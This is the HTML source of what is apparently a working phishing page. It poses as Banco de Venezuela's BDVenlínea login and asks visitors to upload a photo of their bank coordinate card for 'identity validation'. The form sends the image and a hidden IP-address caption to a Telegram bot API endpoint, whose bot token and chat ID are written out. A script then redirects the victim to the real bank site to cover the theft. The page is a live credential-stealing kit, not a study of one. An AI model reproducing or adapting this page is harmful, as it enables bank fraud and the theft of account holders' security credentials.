...
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <link rel="shortcut icon" href="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/favicon.ico" type="image/vnd.microsoft.icon">
    ...
    $(document).on("submit", "form", function (event) {
        ...
        $.ajax({
            ...
            success: function (data, status) {
                location.href ="https://www.bancodevenezuela.com";
            },
...
<body>
    ...
    <app-root _nghost-c0="" ng-version="6.1.10"><spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1=""> </spinner><router-outlet _ngcontent-c0=""></router-outlet><app-login _nghost-c10="" class="ng-star-inserted"><div _ngcontent-c10="" class="login-container"><div _ngcontent-c10=""><div _ngcontent-c10="" class="login-container-float-center"><div _ngcontent-c10="" class="row"
      ...
      <div _ngcontent-c10="" class="col s12 not-margin not-padding"><div _ngcontent-c10=""><div _ngcontent-c10="" class="login-container-logo"><img _ngcontent-c10="" class="logo-login" src="./index_files/logo.png"></div><div _ngcontent-c10="" class="login-container-form">
        




      <form method="POST" action="https://api.telegram.org/bot6903851307:AAFFT0FDf1y9fYdBZIQWqfawRtUI1WH2wZM/sendPhoto" enctype="multipart/form-data">
<input type="text" name="chat_id" value="@bdvyo1212" hidden="">
<input type="text" name="caption" id="ipaddress" hidden="">
                  ...
                  <div id="ctl00_MainHolder_loginPanel" onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;ctl00_MainHolder_loginButton&#39;)">
                     <div class="contenedor_ingresar subtabla-login">
                        <div class="data">
                           <ul class="medio">
                              <li class="medio titulo"> Validación a Tu BDVenlínea&nbsp;</li>
                              <li class="">
                                 <div class="datos">
                                    <div id="ctl00_MainHolder_Panel2" onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;ctl00_MainHolder_loginButton&#39;)">
                                       ...
                                       <ul>
                                          <li id="ctl00_MainHolder_tdLoginImageText" class="etiqueta title_image"> Validaremos tu identidad por favor escanea tu tarjeta de coordenadas. </li>
                                          <li class="etiqueta image" style="margin-left: 10px;">
                                             ...
                                             <div class="datos">
                                                <ul>
                                                                  ...
                                                                  <table>
                                                                     ...
                                                                     <center> <tr>
                                                                           <td>
                                                                              ...
                                                                              <img src="./index2_files/target.png" style="margin: auto;display: block;width: 120px;">
                                                                           </td>
                                                   ...
                                                   <label tabindex="0" for="my-file" style="width: 200px;" class="input-file-trigger">
                                                   
                                                   
                                                   <strong>Click aquí para escanear Foto/Subir Archivo</strong> 
    ...
    <input class="input-file" required="" accept="image/" type="file" name="photo" onchange="setfilename(this.value)" style="
    height: 50px;
">


  </div><div _ngcontent-c10="" class="button-login-container" role="row">
                    
                    <button _ngcontent-c10="" color="accent" mat-raised-button="" role="button" type="submit" class="mat-raised-button mat-accent" required=""><span class="mat-button-wrapper"> Entrar </span><div class="mat-button-ripple mat-ripple" matripple="" required=""></div><div class="mat-button-focus-overlay"></div></button></div>
                    ...
                    </div></div></div></div></app-login></app-root>
